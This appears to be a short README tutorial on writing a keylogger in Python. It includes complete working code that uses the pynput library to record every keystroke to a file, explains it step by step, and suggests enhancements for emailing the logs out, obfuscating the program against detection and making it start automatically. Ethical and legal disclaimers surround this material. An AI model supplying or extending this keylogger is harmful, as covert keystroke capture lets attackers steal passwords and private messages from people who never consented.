# 2-keylogger
Creating a keylogger software can be an educational exercise in understanding cybersecurity and software development. However, it's important to highlight that keyloggers can be used maliciously and are illegal to use without explicit consent from the user being monitored. Therefore, this project should only be conducted in a controlled and ethical environment, such as a personal learning project on your own machine or in a cybersecurity lab setting.

Here's a basic outline of how to create a keylogger using Python. We'll use the pynput library to capture keystrokes.

Steps to Create a Keylogger
Setup Environment:

Install the pynput library: pip install pynput
Create the Keylogger Script:

Create a Python file (e.g., keylogger.py).
Keylogger Code:

python
Copy code
from pynput.keyboard import Key, Listener
import logging

log_dir = ""

logging.basicConfig(filename=(log_dir + "key_log.txt"),
                    level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
Explanation:
Library Import:

pynput.keyboard: This module allows us to monitor and control keyboard input.
logging: This module is used to record the keystrokes to a file.
Logging Setup:

log_dir: The directory where the log file will be saved. In this example, it's set to the current directory.
logging.basicConfig(): Configures the logging module to write the keystrokes to key_log.txt.
Key Press Event:

on_press(key): This function is called whenever a key is pressed. It logs the key press event.
Listener(on_press=on_press): Sets up a listener that triggers the on_press function whenever a key is pressed.
listener.join(): Starts the listener and keeps it running.
Running the Keylogger:
Save the keylogger.py file.
Run the script by executing python keylogger.py.
Ethical and Legal Considerations:
Consent: Only run the keylogger on systems where you have explicit permission from the user.
Legality: Be aware of the legal implications. Unauthorized use of keyloggers can lead to severe legal consequences.
Security: Ensure that any logs or data collected are securely stored and handled to prevent misuse.
Enhancements:
For a more advanced project, consider the following enhancements:

Email Logs: Periodically email the logs to yourself.
Obfuscation: Make the keylogger harder to detect by using obfuscation techniques.
Persistence: Ensure the keylogger starts automatically when the computer starts (requires additional OS-specific steps).
Important Notice:
Developing and using keyloggers should be done responsibly and ethically. This example is for educational purposes only and should not be used for any malicious activity. Always respect privacy and legal boundaries.
